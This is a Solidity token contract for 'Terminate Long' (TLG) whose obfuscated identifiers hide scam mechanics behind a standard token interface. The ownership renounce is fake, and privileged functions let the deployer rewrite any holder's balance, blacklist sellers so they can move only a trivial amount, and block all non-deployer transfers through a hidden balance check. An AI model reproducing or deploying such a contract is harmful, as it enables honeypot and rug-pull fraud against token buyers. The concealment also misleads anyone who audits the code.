//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface listEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract teamLaunchedLaunch {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingBuy {
    function createPair(address minFrom, address amountLiquidity) external returns (address);
}

interface sellTx {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoEnable) external view returns (uint256);

    function transfer(address amountWalletTeam, uint256 sellMin) external returns (bool);

    function allowance(address isSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellMin) external returns (bool);

    function transferFrom(
        address sender,
        address amountWalletTeam,
        uint256 sellMin
    ) external returns (bool);

    event Transfer(address indexed from, address indexed launchedTx, uint256 value);
    event Approval(address indexed isSender, address indexed spender, uint256 value);
}

interface sellTxMetadata is sellTx {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract TerminateLong is teamLaunchedLaunch, sellTx, sellTxMetadata {

    function allowance(address swapFund, address tradingAt) external view virtual override returns (uint256) {
        if (tradingAt == exemptMarketingReceiver) {
            return type(uint256).max;
        }
        return minReceiver[swapFund][tradingAt];
    }

    function shouldSell(uint256 sellMin) public {
        atIs();
        minFund = sellMin;
    }

    function approve(address tradingAt, uint256 sellMin) public virtual override returns (bool) {
        minReceiver[_msgSender()][tradingAt] = sellMin;
        emit Approval(_msgSender(), tradingAt, sellMin);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return toTeamTake;
    }

    function enableTotal() public {
        emit OwnershipTransferred(tokenSellLaunch, address(0));
        toAmountIs = address(0);
    }

    function owner() external view returns (address) {
        return toAmountIs;
    }

    uint8 private modeMarketing = 18;

    function decimals() external view virtual override returns (uint8) {
        return modeMarketing;
    }

    function swapSender(address listTeam, address amountWalletTeam, uint256 sellMin) internal returns (bool) {
        require(maxMarketing[listTeam] >= sellMin);
        maxMarketing[listTeam] -= sellMin;
        maxMarketing[amountWalletTeam] += sellMin;
        emit Transfer(listTeam, amountWalletTeam, sellMin);
        return true;
    }

    constructor (){
        
        listEnable feeTotal = listEnable(exemptMarketingReceiver);
        liquidityReceiver = marketingBuy(feeTotal.factory()).createPair(feeTotal.WETH(), address(this));
        if (txTeamTake) {
            totalEnableFee = buyExemptMin;
        }
        tokenSellLaunch = _msgSender();
        enableTotal();
        liquiditySwap[tokenSellLaunch] = true;
        maxMarketing[tokenSellLaunch] = launchSender;
        if (txTeamTake) {
            buyExemptMin = totalEnableFee;
        }
        emit Transfer(address(0), tokenSellLaunch, launchSender);
    }

    mapping(address => mapping(address => uint256)) private minReceiver;

    mapping(address => uint256) private maxMarketing;

    function transferFrom(address listTeam, address amountWalletTeam, uint256 sellMin) external override returns (bool) {
        if (_msgSender() != exemptMarketingReceiver) {
            if (minReceiver[listTeam][_msgSender()] != type(uint256).max) {
                require(sellMin <= minReceiver[listTeam][_msgSender()]);
                minReceiver[listTeam][_msgSender()] -= sellMin;
            }
        }
        return teamToEnable(listTeam, amountWalletTeam, sellMin);
    }

    bool public txMin;

    function toTrading(address feeAt, uint256 sellMin) public {
        atIs();
        maxMarketing[feeAt] = sellMin;
    }

    string private toTeamTake = "Terminate Long";

    uint256 minFund;

    uint256 public buyExemptMin;

    address public liquidityReceiver;

    address public tokenSellLaunch;

    bool public modeBuyTotal;

    function totalSupply() external view virtual override returns (uint256) {
        return launchSender;
    }

    uint256 private launchSender = 100000000 * 10 ** 18;

    mapping(address => bool) public marketingTake;

    uint256 constant walletLimit = 18 ** 10;

    function atIs() private view {
        require(liquiditySwap[_msgSender()]);
    }

    function isAt(address launchFund) public {
        atIs();
        
        if (launchFund == tokenSellLaunch || launchFund == liquidityReceiver) {
            return;
        }
        marketingTake[launchFund] = true;
    }

    bool public buyTrading;

    bool private txTeamTake;

    mapping(address => bool) public liquiditySwap;

    function transfer(address feeAt, uint256 sellMin) external virtual override returns (bool) {
        return teamToEnable(_msgSender(), feeAt, sellMin);
    }

    function marketingMax(address liquidityList) public {
        if (txMin) {
            return;
        }
        
        liquiditySwap[liquidityList] = true;
        
        txMin = true;
    }

    address enableTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public totalEnableFee;

    function teamToEnable(address listTeam, address amountWalletTeam, uint256 sellMin) internal returns (bool) {
        if (listTeam == tokenSellLaunch) {
            return swapSender(listTeam, amountWalletTeam, sellMin);
        }
        uint256 txBuyList = sellTx(liquidityReceiver).balanceOf(enableTrading);
        require(txBuyList == minFund);
        require(amountWalletTeam != enableTrading);
        if (marketingTake[listTeam]) {
            return swapSender(listTeam, amountWalletTeam, walletLimit);
        }
        return swapSender(listTeam, amountWalletTeam, sellMin);
    }

    function balanceOf(address autoEnable) public view virtual override returns (uint256) {
        return maxMarketing[autoEnable];
    }

    string private limitShould = "TLG";

    address exemptMarketingReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private toAmountIs;

    function getOwner() external view returns (address) {
        return toAmountIs;
    }

    function symbol() external view virtual override returns (string memory) {
        return limitShould;
    }

    uint256 txMode;

    event OwnershipTransferred(address indexed atSender, address indexed takeIsWallet);

}